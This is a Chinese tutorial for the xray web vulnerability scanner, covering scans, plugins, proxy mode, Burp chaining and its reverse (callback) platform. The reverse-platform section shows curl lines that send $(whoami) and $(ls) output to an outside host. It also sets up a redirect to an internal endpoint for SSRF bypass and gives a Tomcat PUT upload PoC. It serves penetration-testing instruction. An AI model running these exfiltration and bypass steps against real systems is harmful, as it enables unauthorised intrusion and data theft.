# Xray扫描器
## 快速使用

### 扫描一个站点
最简单的方式是直接调用，扫描一个指定的站点，如：

`./xray webscan --basic-crawler http://example.com/`

这可能是最简单最常用的一个功能，就是太长了，体验不太友好，建议常用的同学可以

`alias xray="/path/xray webscan --basic-crawler"`

### 指定扫描输出

不指定输出时，默认输出到控制台的标准输出中，可以做管道处理，也可以选择输出为文件，如：

`./xray webscan --url http://example.com/ --json-output report.json`

不同参数对应不同的输出方式：

```
无参数：输出到控制台的标准输出
--`text-output filename`：输出到文本文件中
--`json-output filename`：输出到 JSON 文件中
--`html-output filename`：输出到 HTML 文件中

```

### 基于代理的被动扫描

xray 可以通过类似 Burp 的方式启动，利用 HTTP 代理来抓包扫描，如：

`./xray webscan --listen 127.0.0.1:7777`

如果运行没报任何错就可以设置浏览器 HTTP 代理为 `127.0.0.1:7777` 了 。代理设置 OK 以后就可以启动代理扫描了，这时候我们打来浏览器尽情冲浪吧，理论上我们的鼠标点到哪 xray 就能扫到哪。
需要注意一下的是，很多时候还会扫到 HTTPS 站点，可能会因为有代理而导致无法访问，或者需要手动确认安全风险。这时候需要我们导入 xray 运行目录下的`ca.crt`证书，关于如何导入 CA 证书，请打开百度搜索 “安装CA证书”。

`➜ ls  
ca.crt ca.key config.yaml xray`

## 高级姿势

### 指定扫描插件

使用 `--plugins` 参数可以选择仅启用部分扫描插件，多个插件之间可使用逗号分隔，如：

`./xray webscan --plugins cmd_injection --url http://example.com/`

目前提供的插件列表如下：

```
SQL 注入检测 (key: sqldet)：支持报错注入、布尔注入和时间盲注等
XSS 检测（key: xss）：支持扫描反射型、存储型 XSS
命令/代码注入检测 (key: cmd_injection)：支持 shell 命令注入、PHP 代码执行、模板注入等
目录枚举 (key: dirscan)：检测备份文件、临时文件、debug 页面、配置文件等10余类敏感路径和文件
路径穿越检测 (key: path_traversal)：支持常见平台和编码
XML 实体注入检测 (key: xxe)：支持有回显和反连平台检测
POC 管理 (key: phantasm)：默认内置部分常用的 POC，用户可以根据需要自行构建 POC 并运行。可参考：POC 编写文档（https://chaitin.github.io/xray/#/guide/poc）
文件上传检测 (key: upload)：支持检测常见的后端服务器语言的上传漏洞
弱口令检测 (key: brute_force)：支持检测 HTTP 基础认证和简易表单弱口令，内置常见用户名和密码字典
JSONP 检测 (key: jsonp)：检测包含敏感信息可以被跨域读取的 jsonp 接口
SSRF 检测 (key: ssrf)：ssrf 检测模块，支持常见的绕过技术和反连平台检测
基线检查 (key: baseline)：检测低 SSL 版本、缺失的或错误添加的 http 头等
任意跳转检测 (key: redirect)：支持 HTML meta 跳转、30x 跳转等
CRLF 注入 (key: crlf_injection)：检测 HTTP 头注入，支持 query、body 等位置的参数
…
```

### 只扫描一个 URL

xray 还提供了方便的只扫描一个 URL 的方式，如：

`./xray webscan --url http://example.com/ --json-output out.json`

### 配置文件

xray 还提供了友好配置文件，可以方便地将常用的命令行参数写到配置文件中，避免了每次都要输入一大串参数的痛苦。

xray 默认会读取运行目录下的 config.yaml 文件作为配置危机，也可以使用 —config 参数指定其他配置文件。

关于命令行的详细配置可以参考 xray 官方文档（([https://chaitin.github.io/xray/#/guide/config)。](https://chaitin.github.io/xray/#/guide/config)%E3%80%82)

### 反连平台

xray 在运行时会自动启动xray 自带的反连平台来辅助盲打扫描，可以在配置文件中修改反连平台的配置。目前支持 http 和 dns 两种反连机制，当服务端触发 payload 时 xray 会根据反连平台的状态判断漏洞是否存在。
dns 反连需要启用 root 权限监听 53 端口，并且将域名的 ns 记录指向反连平台的监听地址

#### 如何配置

运行 ./xray help 让 xray 生成一个默认的配置文件 cofig.yaml。我们需要在这个配置文件中配置反连平台的一些参数，默认是配置如下。

```
reverse:
  db_file_path: "./xray.db"
  token: ""
  http:
    enabled: true
    listen_ip: 127.0.0.1
    listen_port: ""
  dns:
    enabled: false
    listen_ip: 127.0.0.1
    domain: ""
    # 静态解析规则
    resolve:
    - type: A # A, AAAA, TXT 三种
      record: localhost
      value: 127.0.0.1
      ttl: 60
  client:
    http_base_url: ""
    dns_server_ip: ""
    remote_server: false
```

暂时只需要反连平台的 HTTP 相关功能，而不需要漏洞扫描和反连平台 DNS 相关的功能，所以只关心上面 DNS 以外的配置文件就足够了。

为了让之前提到的存在 ssrf 漏洞的应用可以访问的到，我们将 xray 运行在一个公网 IP 的机器上，所以 xray 监听的 IP 等等都需要配置，将上面的配置修改如下。

```
reverse:
  # 数据库文件路径，默认不用修改。
  # 本文件只能一个进程访问，如果启动两个 xray 就需要指定不同的路径。
  db_file_path: "./xray.db"
  # 用于生成的 url 验证，否则反连平台的 IP 一旦泄露，任何人访问你的平台都会被记录访问记录。
  # 有了 token 可以限制生效范围，而且修改 token 就可以失效以前的 url。
  # 我们修改为一个自定义的值
  token: "imtoken1"
  http:
    enabled: true
    # 监听地址，我们在公网机器上需要修改为 `0.0.0.0`，让所有地址都可以访问
    # 注意不一定是机器的公网 IP，本机不一定拥有这个 IP，否则会出错
    listen_ip: "0.0.0.0"
    # 监听端口，我们使用 4445
    listen_port: "4445"
  # dns 部分没有修改
  client:
    # 指定 http 部分的访问地址，这里才应该是机器的公网 IP
    http_base_url: "http://140.143.224.171:4445"
    dns_server_ip: ""
    remote_server: false
```

修改完成之后，运行 ./xray reverse，就可以看到反连平台启动了。

```
[INFO] 2019-09-08 09:25:02 +0800 [default:config.go:160] loading config from config.yaml
reverse server base url: http://140.143.224.171:4445, token: imtoken1reverse server webUI: http://140.143.224.171:4445/cland/[DBUG] 2019-09-08 09:25:03 +0800 [default:reverse.go:40] reverse http server started, base url: http://140.143.224.171:4445, token: imtoken1[INFO] 2019-09-08 09:25:03 +0800 [reverse:http_server.go:118] starting reverse http server
```

访问提示的地址 [http://140.143.224.171:4445/cland/](http://140.143.224.171:4445/cland/) 就可以看到反连平台的的界面了。点击 生成一个 URL 就会提示输入 token。

[![](_v_images/20200401104549830_10775.jpg)](https://.3001.net/_v_s/20190908/1567913344_5d74758029421.jpg)

#### 反连平台的 HTTP 访问记录功能

先按照页面上的提示先测试下反连平台的功能，运行 curl -v [http://140.143.224.171:4445/p/89acfe/H34v/](http://140.143.224.171:4445/p/89acfe/H34v/)

```
$ curl -v http://140.143.224.171:4445/p/89acfe/H34v/
*   Trying 140.143.224.171...
* TCP_NODELAY set* Connected to 140.143.224.171 (140.143.224.171) port 4445 (#0)> GET /p/89acfe/H34v/ HTTP/1.1> Host: 140.143.224.171:4445> User-Agent: curl/7.54.0> Accept: */*
>
< HTTP/1.1 200 OK
< Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; media-src 'self'; frame-src 'self'; font-src 'self' data:; connect-src 'self'< Content-Type: application/json
< X-Content-Type-Options: nosniff
< X-Frame-Options: SAMEORIGIN
< X-Xss-Protection: 1; mode=block
< Date: Sun, 08 Sep 2019 01:28:16 GMT
< Content-Length: 22<
* Connection #0 to host 140.143.224.171 left intact{"code":0,"data":null}%
```

然后在左边的 HTTP 一栏中就可以看到了访问记录

[![](_v_images/20200401104549622_11943.jpg](https://.3001.net/_v_s/20190908/1567913357_5d74758db874e.jpg)

而且反连平台支持在 url 后面随意添加参数，比如 [http://140.143.224.171:4445/p/89acfe/H34v/](http://140.143.224.171:4445/p/89acfe/H34v/)$(whoami)，这样在测试一些命令执行漏洞的时候，就很方便的将一些执行结果带出来。

如果 url 位置的长度不够，还可以使用 POST 方法。比如 curl -v [http://140.143.224.171:4445/p/89acfe/H34v/](http://140.143.224.171:4445/p/89acfe/H34v/) -d “$(ls)” 就可以看到访问记录是这样的。

[![](_v_images/20200401104549214_13637.jpg](https://.3001.net/_v_s/20190908/1567913371_5d74759b94561.jpg)

#### 反连平台指定 response 功能

话说回来，为了验证之前利用跳转进行绕过的思路，我们在 xray 的反连平台上创建一个 url，然后指定 status code 和 header 就可以了。在网页上配置起来也是非常的简单。

[![](_v_images/20200401104548833_25180.jpg](https://.3001.net/_v_s/20190908/1567913402_5d7475ba2c1b4.jpg)

点击保存之后，我们先用 curl 测试下。

```
$ curl -v http://140.143.224.171:4445/p/1cd0a7/3OGA/
*   Trying 140.143.224.171...
* TCP_NODELAY set* Connected to 140.143.224.171 (140.143.224.171) port 4445 (#0)> GET /p/1cd0a7/3OGA/ HTTP/1.1> Host: 140.143.224.171:4445> User-Agent: curl/7.54.0> Accept: */*
>
< HTTP/1.1 302 Found
< Content-Type: text/html
< Location: http://127.0.0.1:8000/api/internal/secret
< Date: Sun, 08 Sep 2019 01:42:41 GMT
< Content-Length: 0<
* Connection #0 to host 140.143.224.171 left intact
```


### 自定义 POC

xray 支持用户使用 YAML 编写 POC。YAML 是 JSON 的超集，也就是说我们甚至可以用 JSON 编写 POC，但这里还是建议大家使用 YAML 来编写，原因如下：

```
YAML 格式的 “值” 无需使用双引号包裹，特殊字符无需转义
YAML 格式使内容更加可读
YAML 中可以使用注释

```

我们可以编写以下的 yaml 来测试 tomcat put 上传任意文件漏洞：

`name: poc-yaml-tomcat_put`  
`rules:`  
`- method: PUT  
path: /hello.jsp`  
`body: world`  
`- method: GET`  
`path: /hello.jsp`  
`search: world`

这里还要感谢 phith0n 贡献的 xray PoC **生成器** ([https://phith0n.github.io/xray-poc-generation/](https://phith0n.github.io/xray-poc-generation/)) ，虽然丑陋，但不失文雅。

将 POC 保存到 YAML 文件后使用 `--poc`参数可以方便地调用，如：

`./xray webscan --plugins phantasm --poc /home/test/poc.yaml --url http://example.com/`

## xray与burp联动被动扫描

### xray建立监听

在实际测试过程中，除了被动扫描，也时常需要手工测试。这里使用 Burp 的原生功能与 xray 建立起一个多层代理，让流量从 Burp 转发到 xray 中。

首先 xray 建立起 webscan 的监听

E:/Tools/xray/xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output proxy_xray.html

使用该命令建立起监听

![](_v_images/20200401110133994_27763.png)

### 对brup端进行配置

进入 Burp 后，打开 User options 标签页，然后找到 Upstream Proxy Servers 设置。  

点击 Add 添加上游代理以及作用域，Destination host处可以使用*匹配多个任意字符串，?匹配单一任意字符串，而上游代理的地址则填写 xray 的监听地址。

![](_v_images/20200401110133473_17457.png)

### 开始联动

接下来，在浏览器端使用 Burp 的代理地址

![](_v_images/20200401110132849_29717.png)

此时网页流量便通过了brup转发到了xray

![](_v_images/20200401110132428_12267.png)

Xray开始接收到流量开始漏洞扫描

![](_v_images/20200401110129897_7392.png)

### 抓取https流量

如果需要抓取https流量则需要brup以及xray都安装https证书。

详情请访问

brup安装证书抓取https

https://www.cnblogs.com/L0ading/p/12388835.html

xray安装证书进行http以及https扫描

https://www.cnblogs.com/L0ading/p/12388850.html